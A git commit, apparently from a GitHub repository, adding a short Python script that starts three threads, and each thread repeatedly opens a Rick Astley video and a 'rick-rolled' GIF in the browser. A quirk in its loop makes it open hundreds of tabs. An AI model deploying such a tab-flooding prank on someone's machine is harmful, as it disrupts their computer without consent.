c36d6f6ed8bba435a198a8cf046fb77e221f251d
sorrow <71972762+inadvertently@users.noreply.github.com>
2021-12-02 19:30:41 -0500

    Add files via upload

---
+++ src/main.py
@@ -0,0 +1,18 @@
+import webbrowser, threading
+from threading import Thread
+
+
+def setup():
+    setup = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab'
+    startup = 'https://c.tenor.com/CWgfFh7ozHkAAAAC/rick-astly-rick-rolled.gif'
+    for x in setup and startup:
+        webbrowser.open(setup)
+        webbrowser.open(startup)
+
+if threading.active_count() <= 500:
+    Thread(target=setup).start()
+    Thread(target=setup).start()
+    Thread(target=setup).start()
+
+
+
